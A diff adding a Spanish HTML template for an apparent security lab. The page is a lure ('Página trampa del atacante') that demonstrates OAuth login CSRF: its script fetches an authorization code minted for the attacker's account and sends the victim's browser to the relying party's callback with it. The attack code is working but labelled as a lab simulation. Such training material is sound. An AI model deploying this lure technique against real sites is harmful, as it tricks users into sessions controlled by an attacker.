@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Oferta imperdible</title>
+  <style>
+    html { background: #2e0c0c; min-height: 100%; }
+    body { font-family: system-ui, sans-serif; max-width: 680px; margin: 3rem auto;
+           padding: 0 1.2rem; background: radial-gradient(1200px 560px at 50% -8%, #7a1d1d, #2e0c0c) fixed; color: #e5e5e5; text-align: center; }
+    h1 { color: #ffb86c; }
+    .btn { display: inline-block; margin-top: 1.4rem; padding: .9rem 1.6rem; border-radius: 10px;
+           background: #16a34a; color: white; font-weight: 800; font-size: 1.2rem;
+           text-decoration: none; }
+    .btn.disabled { background: #444; pointer-events: none; }
+    .small { color: #888; font-size: .85rem; margin-top: 1.4rem; }
+    code { color: #ffb86c; }
+  </style>
+</head>
+<body>
+  <h1>🎁 Página trampa del atacante</h1>
+  <p>Simula un sitio cualquiera que la víctima abre. Al hacer clic, su navegador completa el
+     callback del RP con un <code>code</code> que preparó el atacante.</p>
+  <p class="small">Variante objetivo: <strong>{{ variant }}</strong></p>
+
+  <a id="go" class="btn disabled" href="#">Preparando&hellip;</a>
+
+  <p class="small" id="info">Pidiendo un code fresco a nombre de <code>atacante@lab.local</code>&hellip;</p>
+
+  <script>
+    const variant = {{ variant|tojson }};
+    fetch('/caso3/csrf/code?variant=' + encodeURIComponent(variant))
+      .then(r => r.json())
+      .then(d => {
+        const go = document.getElementById('go');
+        if (d.url) {
+          go.href = d.url;
+          go.textContent = 'Continuar ▶';
+          go.classList.remove('disabled');
+          document.getElementById('info').innerHTML =
+            'Code listo (cuenta <code>' + d.account + '</code>). Hacé clic como lo haría la víctima.';
+        } else {
+          document.getElementById('info').textContent = 'Error: ' + (d.error || 'desconocido');
+        }
+      })
+      .catch(e => { document.getElementById('info').textContent = 'Error: ' + e; });
+  </script>
+</body>
+</html>
